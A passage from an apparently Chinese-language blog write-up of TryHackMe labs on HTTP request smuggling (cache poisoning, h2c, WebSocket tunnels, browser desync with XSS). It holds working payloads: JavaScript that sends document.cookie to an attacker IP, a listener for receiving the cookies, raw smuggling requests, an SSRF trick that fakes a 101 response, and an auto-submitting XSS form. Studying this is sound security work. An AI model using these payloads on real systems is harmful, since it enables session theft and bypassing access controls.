style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">4</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">status</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">200</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E5C07B">document</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getElementById</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;demo&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #E06C75">innerHTML</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">xhttp</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">responseText</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">};</span></span><span class="line"><span style="color: #E5C07B">xhttp</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">open</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;GET&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;https://10.11.141.2:8002/?c=&quot;</span><span style="color: #56B6C2">+</span><span style="color: #E5C07B">document</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">cookie</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">xhttp</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">send</span><span style="color: #ABB2BF">();</span></span></code></pre></div></div></figure><p><strong>生成自签证书</strong></p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">openssl</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">req</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x509</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-newkey</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rsa:4096</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-keyout</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">key.pem</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-out</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cert.pem</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-sha256</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-days</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">3650</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-nodes</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-subj</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname&quot;</span></span></code></pre></div></div></figure><p><strong>HTTPS 服务端</strong></p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> http.server </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> HTTPServer, BaseHTTPRequestHandler</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> ssl</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 定义服务器地址和端口</span></span><span class="line"><span style="color: #ABB2BF">host </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;0.0.0.0&#39;</span></span><span class="line"><span style="color: #ABB2BF">port </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">8002</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 1. 创建一个 SSLContext 对象</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># ssl.PROTOCOL_TLS_SERVER 是推荐用于服务器的协议版本，它会自动协商最新的TLS版本</span></span><span class="line"><span style="color: #ABB2BF">context </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> ssl.</span><span style="color: #61AFEF">SSLContext</span><span style="color: #ABB2BF">(ssl.</span><span style="color: #D19A66">PROTOCOL_TLS_SERVER</span><span style="color: #ABB2BF">) </span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 2. 加载证书和私钥</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># keyfile 是私钥文件路径，certfile 是证书文件路径</span></span><span class="line"><span style="color: #ABB2BF">context.</span><span style="color: #61AFEF">load_cert_chain</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75; font-style: italic">certfile</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;cert.pem&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75; font-style: italic">keyfile</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;key.pem&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 创建 HTTP 服务器实例</span></span><span class="line"><span style="color: #ABB2BF">httpd </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HTTPServer</span><span style="color: #ABB2BF">((host, port), BaseHTTPRequestHandler)</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 3. 使用 SSLContext 实例的 .wrap_socket() 方法来包装服务器的套接字</span></span><span class="line"><span style="color: #ABB2BF">httpd.socket </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> context.</span><span style="color: #61AFEF">wrap_socket</span><span style="color: #ABB2BF">(httpd.socket, </span><span style="color: #E06C75; font-style: italic">server_side</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">True</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">f</span><span style="color: #98C379">&quot;HTTPS server running on https://</span><span style="color: #D19A66">{</span><span style="color: #ABB2BF">host</span><span style="color: #D19A66">}</span><span style="color: #98C379">:</span><span style="color: #D19A66">{</span><span style="color: #ABB2BF">port</span><span style="color: #D19A66">}</span><span style="color: #98C379">/&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 启动服务器</span></span><span class="line"><span style="color: #ABB2BF">httpd.</span><span style="color: #61AFEF">serve_forever</span><span style="color: #ABB2BF">()</span></span></code></pre></div></div></figure><p><strong>burp payload</strong></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">bar</span></span><span class="line"><span style="color: #abb2bf">Host: 10.10.161.96:8100</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">GET /static/uploads/myjs.js HTTP/1.1</span></span></code></pre></div></div></figure><p>记得在 HTTP&#x2F;2.0 header 里面加一个 <code>pragma: no-cache</code></p><p><strong>测试缓存是否生效</strong></p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">curl</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-kv</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">https://10.10.161.96:8100/static/text.js</span></span></code></pre></div></div></figure><h2 id="H2c-走私"><a href="#H2c-走私" class="headerlink" title="H2c 走私"></a>H2c 走私</h2><h3 id="HTTP-版本协商"><a href="#HTTP-版本协商" class="headerlink" title="HTTP 版本协商"></a>HTTP 版本协商</h3><p>Web 服务器能够在单个端口上提供多种 HTTP 协议版本。这样做的好处是，它<strong>无需保证</strong>用户浏览器一定支持 HTTP&#x2F;2。通过这种方式，服务器可以同时提供 HTTP&#x2F;1.1 和 HTTP&#x2F;2，客户端则可以自行选择想要使用的版本。这个过程被称为<strong>协议协商（negotiation）</strong>，并且完全由你的浏览器负责处理。</p><p>原始的 HTTP&#x2F;2 标准定义了2种方式去协商 HTTP&#x2F;2，取决于双方之间的通信加密了没有。</p><ul><li><code>h2</code>： 当 HTTP&#x2F;2 运行在 <strong>TLS 加密通道</strong>上时，使用的就是 <code>h2</code> 协议。它依赖于 TLS 的<strong>应用层协议协商 (ALPN)</strong> 机制来提供 HTTP&#x2F;2 服务。</li><li><code>h2c</code>： <code>h2c</code> 指的是在<strong>明文通道</strong>上运行的 HTTP&#x2F;2。这通常在没有加密可用的场景下使用。由于 ALPN 是 TLS 的一个特性，因此无法在明文通道中使用它。在这种情况下，客户端会发送一个初始的 <strong>HTTP&#x2F;1.1 请求</strong>，并附加几个特定的头部来<strong>请求升级到 HTTP&#x2F;2</strong>。如果服务器确认并接受这些额外的头部，连接就会成功升级到 HTTP&#x2F;2。</li></ul><h3 id="升级到-h2c"><a href="#升级到-h2c" class="headerlink" title="升级到 h2c"></a>升级到 h2c</h3><p>当协商建立一个<strong>明文的 HTTP&#x2F;2 连接</strong>时，客户端会发送一个常规的 <strong>HTTP&#x2F;1.1 请求</strong>，其中包含 <code>Upgrade: h2c</code> 头部，以告知服务器它支持 <code>h2c</code>。该请求还必须包含一个额外的 <code>HTTP2-Settings</code> 头部，其中带有我们在此不详细讨论的协商参数。一个符合规范的服务器将以 <code>101 Switching Protocols</code> 响应来接受升级。从那时起，连接就会切换到 HTTP&#x2F;2 协议。</p><p>这个其实是用访问合法端点构建起 HTTP&#x2F;2 隧道之后，再用隧道进行访问，从而绕过前端的限制。</p><p>这里要用 <a href="https://github.com/Recopec/h2csmuggler">h2csmuggler</a> 工具，原版要用老版 python 跑，我修改之后支持 python3.14 同时修复了自签证书的问题。</p><h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><ul><li><a href="https://portswigger.net/research/http2">HTTP&#x2F;2: The Sequel is Always Worse</a> by James Kettle.</li><li><a href="https://bishopfox.com/blog/h2c-smuggling-request">h2c Smuggling: Request Smuggling Via HTTP&#x2F;2 Cleartext (h2c)</a> by Jake Miller.</li></ul><h2 id="番外"><a href="#番外" class="headerlink" title="番外"></a>番外</h2><p><strong>为什么 HTTP&#x2F;2 能有效避免 HTTP&#x2F;1.1 中常见的由于连接复用导致的请求走私？</strong></p><p>这主要归结于 HTTP&#x2F;2 在协议设计上的根本性改变，尤其是它处理请求和响应边界的方式。</p><hr><h3 id="HTTP-1-1-走私的根本原因"><a href="#HTTP-1-1-走私的根本原因" class="headerlink" title="HTTP&#x2F;1.1 走私的根本原因"></a>HTTP&#x2F;1.1 走私的根本原因</h3><p>在 HTTP&#x2F;1.1 中，请求走私之所以普遍，是因为存在多种方式来<strong>定义请求体的结束位置</strong>（比如 <code>Content-Length</code> 和 <code>Transfer-Encoding: chunked</code>）。当中间代理服务器和后端服务器对这些定义<strong>解析不一致</strong>时，它们就会对同一个 TCP 连接上的 HTTP 请求边界产生不同的理解。</p><p>想象一下，HTTP&#x2F;1.1 就像是发送一连串没有明确分界线的文字，代理和服务器各自揣摩哪句话在哪里结束，这就很容易出错，导致后面的文字被当成了另一句话的开头。</p><hr><h3 id="HTTP-2-如何解决这个问题"><a href="#HTTP-2-如何解决这个问题" class="headerlink" title="HTTP&#x2F;2 如何解决这个问题"></a>HTTP&#x2F;2 如何解决这个问题</h3><p>HTTP&#x2F;2 从根本上重构了数据传输方式，引入了<strong>二进制分帧层（Binary Framing Layer）</strong>。这就好比 HTTP&#x2F;2 不再发送一连串文字，而是发送一个个<strong>带有明确标签和长度的包裹</strong>。</p><p>具体来说，HTTP&#x2F;2 解决了 HTTP&#x2F;1.1 中走私问题的关键点有：</p><ol><li><strong>精确的长度指示器：</strong> 在 HTTP&#x2F;2 中，所有的 HTTP 消息（包括请求和响应）都被分解成更小的、独立的<strong>二进制帧（frames）</strong>。每个帧都有一个<strong>明确的类型</strong>（例如，HEADERS 帧用于头部，DATA 帧用于请求体）和<strong>精确的长度字段</strong>。<ul><li>这意味着，无论是请求头、请求体，还是其他元数据，都被封装在<strong>自带大小信息</strong>的帧中。解析器不再需要依赖 <code>Content-Length</code> 或 <code>Transfer-Encoding</code> 这样的头部来推断请求体的长度，因为数据帧本身就包含了精确的长度信息。</li><li>举个例子，一个 HEADERS 帧会明确告诉你它包含多少字节的头部数据，一个 DATA 帧会明确告诉你它包含多少字节的请求体数据。</li></ul></li><li><strong>单一、严格的解析逻辑：</strong> HTTP&#x2F;2 的解析器只遵循这一套严格的<strong>二进制分帧规则</strong>。它不会像 HTTP&#x2F;1.1 那样，在 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 之间进行选择或优先级判断。这种<strong>单一且强制的解析机制</strong>消除了前端代理和后端服务器对请求边界产生歧义的可能性。</li><li><strong>连接复用与多路复用：</strong> 尽管 HTTP&#x2F;2 也支持连接复用，但它使用的是<strong>多路复用（Multiplexing）</strong>。这意味着在同一个 TCP 连接上，可以同时传输多个独立的请求和响应。每个请求&#x2F;响应流都有自己的唯一标识符，并且它们的帧可以交错发送，但由于每个帧都带有流 ID 和长度信息，它们在接收端可以被正确地重组。这进一步增强了请求之间的隔离性，降低了相互干扰的风险。</li></ol><h1 id="Request-Smuggling-WebSockets"><a href="#Request-Smuggling-WebSockets" class="headerlink" title="Request Smuggling: WebSockets"></a>Request Smuggling: WebSockets</h1><p>这个房间本质上还是利用 HTTP 的漏洞，只不过是利用了协议升级，前后端服务器存在的行为不一致的问题。</p><h2 id="从-HTTP-升级到-Websockets"><a href="#从-HTTP-升级到-Websockets" class="headerlink" title="从 HTTP 升级到 Websockets"></a>从 HTTP 升级到 Websockets</h2><p>客户端发起一个 HTTP 请求，其中包含 <code>Upgrade: websocket</code> 头部。如果服务器支持 WebSocket 协议，它就会回复 <code>101 Switching Protocols</code> 响应，并相应地升级该连接。从那一刻起，连接将使用 WebSocket 协议而非 HTTP 协议。</p><p>如果你在中间引入一个代理，情况就会变得有趣起来：大多数代理服务器不会亲自处理 WebSocket 升级请求，而是<strong>将其直接转发给后端服务器</strong>。一旦连接成功升级，代理就会在客户端和后端服务器之间<strong>建立一条隧道</strong>。这样一来，所有后续的 WebSocket 流量都将不受干扰地直接转发到后端服务器。</p><p>我们现在面临的问题是，这条隧道使用的是 WebSocket 协议而非 HTTP。如果此时我们尝试利用这条隧道来走私一个 HTTP 请求，后端服务器将会拒绝它，因为它此时正期待接收 WebSocket 请求。</p><p>那我们能不能让代理服务器到后端服务器的连接不升级呢？或者是能不能让代理服务器误认为这个连接升级，然后建立起这个隧道。</p><h2 id="通过有缺陷的-WebSocket-隧道走私-HTTP-请求"><a href="#通过有缺陷的-WebSocket-隧道走私-HTTP-请求" class="headerlink" title="通过有缺陷的 WebSocket 隧道走私 HTTP 请求"></a>通过有缺陷的 WebSocket 隧道走私 HTTP 请求</h2><p>为了通过一个有漏洞的代理服务器走私请求，我们可以创建一个畸形请求，让代理服务器误认为正在执行 WebSocket 升级，但后端服务器实际上并没有升级连接。这将迫使代理在客户端和服务器之间建立一个隧道，由于代理假设这已是一个 WebSocket 连接，因此它不会再检查隧道内的流量，而后端服务器却仍然期望接收 HTTP 流量。</p><p>强制实现（即让代理建立一个未检查的隧道，而后端仍期望 HTTP 流量）的一种方法是，发送一个带有无效 <code>Sec-WebSocket-Version</code> 头部的升级请求。但是后端会发一个 <code>426 Upgrade Required</code> 响应去表示这个升级是不成功的。</p><p>一般 <code>Sec-WebSocket-Version</code> 是 13，我们可以填一个高于这个版本的就行。</p><p>但是某些代理会不管后端服务器的响应，假定这个升级是始终完成的。然后这个<strong>假的</strong> WebSocket 隧道就建立起来了，我们就可以往里面发送 HTTP 请求了。 </p><p>但是这个技巧不会去污染别的用户的请求，所以我们只能用来绕过前端的一些请求限制。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET /socket HTTP/1.1</span></span><span class="line"><span style="color: #abb2bf">Host: MACHINE_IP:8001</span></span><span class="line"><span style="color: #abb2bf">Sec-WebSocket-Version: 777</span></span><span class="line"><span style="color: #abb2bf">Upgrade: WebSocket</span></span><span class="line"><span style="color: #abb2bf">Connection: Upgrade</span></span><span class="line"><span style="color: #abb2bf">Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">GET /flag HTTP/1.1</span></span><span class="line"><span style="color: #abb2bf">Host: MACHINE_IP:8001</span></span></code></pre></div></div></figure><h2 id="绕过代理限制"><a href="#绕过代理限制" class="headerlink" title="绕过代理限制"></a>绕过代理限制</h2><p>跟着 Room 走就行，我用的 Payload 如下，注意最后有两个回车，还有记得取消 Update Content-Length。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET /socket HTTP/1.1</span></span><span class="line"><span style="color: #abb2bf">Host: MACHINE_IP:8001</span></span><span class="line"><span style="color: #abb2bf">Sec-WebSocket-Version: 777</span></span><span class="line"><span style="color: #abb2bf">Upgrade: WebSocket</span></span><span class="line"><span style="color: #abb2bf">Connection: Upgrade</span></span><span class="line"><span style="color: #abb2bf">Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">GET /flag HTTP/1.1</span></span><span class="line"><span style="color: #abb2bf">Host: MACHINE_IP:8001</span></span></code></pre></div></div></figure><p>如果失败的话，可以用 nc 发请求，一样的。</p><h2 id="绕过”安全“的代理"><a href="#绕过”安全“的代理" class="headerlink" title="绕过”安全“的代理"></a>绕过”安全“的代理</h2><p>某些代理会检验后端是否发送了成功升级的请求，如果没有，就不升级连接。但是我们可以通过 SSRF 来实现这点。</p><p>下面是一个会始终发送 <code>101 Switching Protocols</code> 响应的代码，我们通过 SSRF，导致后端会回显这个响应，欺骗代理服务器连接已经建立了，建立起 WebSocket 隧道。</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> sys</span></span><span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> http.server </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> HTTPServer, BaseHTTPRequestHandler</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(sys.argv)</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;&quot;&quot;</span></span><span class="line"><span style="color: #98C379">Usage: </span><span style="color: #D19A66">{}</span><span style="color: #98C379"> </span></span><span class="line"><span style="color: #98C379">    &quot;&quot;&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">format</span><span style="color: #ABB2BF">(sys.argv[</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">]))</span></span><span class="line"><span style="color: #ABB2BF">    sys.</span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">()</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Redirect</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">BaseHTTPRequestHandler</span><span style="color: #ABB2BF">):</span></span><span class="line"><span style="color: #ABB2BF">   </span><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">do_GET</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B; font-style: italic">self</span><span style="color: #ABB2BF">):</span></span><span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.protocol_version </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HTTP/1.1&quot;</span></span><span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">send_response</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">101</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">end_headers</span><span style="color: #ABB2BF">()</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">HTTPServer</span><span style="color: #ABB2BF">((</span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">int</span><span style="color: #ABB2BF">(sys.argv[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])), Redirect).</span><span style="color: #61AFEF">serve_forever</span><span style="color: #ABB2BF">()</span></span></code></pre></div></div></figure><p>前端用的 Payload 如下</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET /check-url?server=http://10.11.141.2:5555 HTTP/1.1</span></span><span class="line"><span style="color: #abb2bf">Host: 10.10.12.34:8002</span></span><span class="line"><span style="color: #abb2bf">Sec-WebSocket-Version: 13</span></span><span class="line"><span style="color: #abb2bf">Upgrade: WebSocket</span></span><span class="line"><span style="color: #abb2bf">Connection: Upgrade</span></span><span class="line"><span style="color: #abb2bf">Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">GET /flag HTTP/1.1</span></span><span class="line"><span style="color: #abb2bf">Host: 10.10.12.34:8002</span></span></code></pre></div></div></figure><h2 id="推荐阅读-1"><a href="#推荐阅读-1" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><ul><li><a href="https://github.com/0ang3el/websocket-smuggle">https://github.com/0ang3el/websocket-smuggle</a></li></ul><h1 id="HTTP-Browser-Desync"><a href="#HTTP-Browser-Desync" class="headerlink" title="HTTP Browser Desync"></a>HTTP Browser Desync</h1><p>利用 HTTP Keep-Alive 特性，一个请求不会实际上关闭这个连接，在一个 POST 请求后面拼接一些构造好的请求。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/Web_Application_Pentesting.assets/298d76a6f0bdc20abdd69a78516f1a46.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/63c131e50a24c3005eb34678/room-content/298d76a6f0bdc20abdd69a78516f1a46.png" data-caption="https://tryhackme-images.s3.amazonaws.com/user-uploads/63c131e50a24c3005eb34678/room-content/298d76a6f0bdc20abdd69a78516f1a46.png" loading="lazy"></p><p>具体场景的我不太清楚怎么做，但是在下一个 Task 带着我们做了这一点，在页面刷新之后会跳转到构造好的那个端点里面。</p><p>这个是用来测试网页是否存在去同步漏洞的 Payload。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">fetch(&#39;http://MACHINE_IP:5000/&#39;, {</span></span><span class="line"><span style="color: #abb2bf">    method: &#39;POST&#39;,</span></span><span class="line"><span style="color: #abb2bf">    body: &#39;GET /redirect HTTP/1.1\r\nFoo: x&#39;,</span></span><span class="line"><span style="color: #abb2bf">    mode: &#39;cors&#39;,</span></span><span class="line"><span style="color: #abb2bf">})</span></span></code></pre></div></div></figure><p>就相当于下一条请求是请求 &#x2F;redirect 这个 URL。不管实际上请求的是啥，具体的 HTTP 包可以看上面👆那个图。</p><h2 id="HTTP-浏览器去同步漏洞链-XSS"><a href="#HTTP-浏览器去同步漏洞链-XSS" class="headerlink" title="HTTP 浏览器去同步漏洞链 XSS"></a>HTTP 浏览器去同步漏洞链 XSS</h2><p>Payload 如下</p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">form</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">id</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;btn&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">action</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://challenge.thm/&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">method</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;POST&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">enctype</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;text/plain&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">textarea</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">name</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;GET http://YOUR_IP HTTP/1.1</span></span><span class="line"><span style="color: #98C379">AAA: A&quot;</span><span style="color: #ABB2BF">&gt;placeholder1&lt;/</span><span style="color: #E06C75">textarea</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">button</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">type</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;submit&quot;</span><span style="color: #ABB2BF">&gt;placeholder2&lt;/</span><span style="color: #E06C75">button</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">form</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E5C07B">btn</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">submit</span><span style="color: #ABB2BF">() &lt;/</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><p>注意这里 enctype 是 text&#x2F;plain，他会将表单字段的 <code>name</code> 属性和 <code>value</code> 属性<strong>原样拼接</strong>，并且使用<strong>换行符 (<code>\r\n</code>)</strong> 作为不同字段之间的分隔符。然后实际的请求体是：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET http://YOUR_IP HTTP/1.1\r\nAAA: A=placeholder1</span></span></code></pre></div></div></figure><p>页面加载之后，这个表单会自动提交，无须用户点击。</p><h2 id="挑战-1"><a href="#挑战-1" class="headerlink" title="挑战"></a>挑战</h2><p>给了我们一个页面，其实这个可以直接用 XSS 偷出来，但是题目给的 wp 是用了去同步 + XSS，下面是用到的一些 Payload。</p><p>前端用的 XSS</p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">form</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">id</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;btn&quot;</span><span 